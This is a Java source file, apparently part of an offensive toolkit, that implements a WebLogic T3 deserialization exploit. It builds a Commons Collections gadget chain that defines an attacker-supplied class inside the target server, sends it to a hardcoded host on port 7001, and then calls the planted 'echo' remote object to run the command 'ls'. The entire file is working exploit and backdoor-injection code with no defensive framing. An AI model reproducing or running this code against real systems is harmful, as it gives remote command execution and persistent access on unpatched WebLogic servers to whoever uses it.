package com.Jasetol.payloads.weblogic;

import com.Jasetol.utils.ClassFiles;
import com.Jasetol.utils.ParseArgs;
import com.Jasetol.utils.Reflect;
import com.Jasetol.utils.SerWithUnSer;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import weblogic.cluster.singleton.ClusterMasterRemote;
import weblogic.utils.classloaders.ClasspathClassLoader;
import javax.naming.Context;
import javax.naming.InitialContext;
import java.net.URL;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Hashtable;
/*
* CommonsCollection06
* */
public class echoForWebLogic {

    private static String host = "192.168.134.133";
    private static String port = "7001";
    private static String className = "com.Jasetol.payloads.weblogic.RMIForecho";
    private static byte[] bytes = new byte[]{};

    public static void exploit() throws Exception{
        String url = "t3://" + host + ":" + port;
        Hashtable env = new Hashtable();
        env.put(Context.INITIAL_CONTEXT_FACTORY,"weblogic.jndi.WLInitialContextFactory");
        env.put(Context.PROVIDER_URL,url);
        env.put("weblogic.jndi.requestTimeout",15000L);
        InitialContext initialContext = new InitialContext(env);
        ClusterMasterRemote remote = (ClusterMasterRemote) initialContext.lookup("echo");
        String result = remote.getServerLocation("ls");
        System.out.println(result);
    }

    public static void injectRMI() throws Exception{
        // 构造 Transformer[] 数组
        bytes = ClassFiles.classAsBytes(RMIForecho.class);
        Transformer[] transformer = new Transformer[]{
                new ConstantTransformer(ClasspathClassLoader.class),
                new InvokerTransformer("getDeclaredConstructor",new Class[]{Class[].class},new Object[]{new Class[0]}),
                new InvokerTransformer("newInstance",new Class[]{Object[].class},new Object[]{new Object[0]}),
                new InvokerTransformer("defineCodeGenClass",new Class[]{String.class,byte[].class, URL.class},new Object[]{className,bytes,null}),
                new ConstantTransformer(new HashSet())
        };


        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{});
        LazyMap lazyMap = (LazyMap) LazyMap.decorate(new HashMap(), chainedTransformer);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(new HashMap(),"ky0116");
        HashMap hashMap = new HashMap();
        hashMap.put(tiedMapEntry,"ky0116");
        // 反射对字段进行赋值,防止在构造 payload 的时候触发 Gadget
        Reflect.reflectSetField(tiedMapEntry,"map",lazyMap);
        Reflect.reflectSetField(chainedTransformer,"iTransformers",transformer);

        byte[] serialize = SerWithUnSer.serializeObject(hashMap);
        T3ProtocolOperation.send(host, Integer.parseInt(port),serialize);
    }


    public static void main(String[] args) throws Exception{
        ParseArgs.parseArgs(args);
        injectRMI();
        exploit();
    }
}
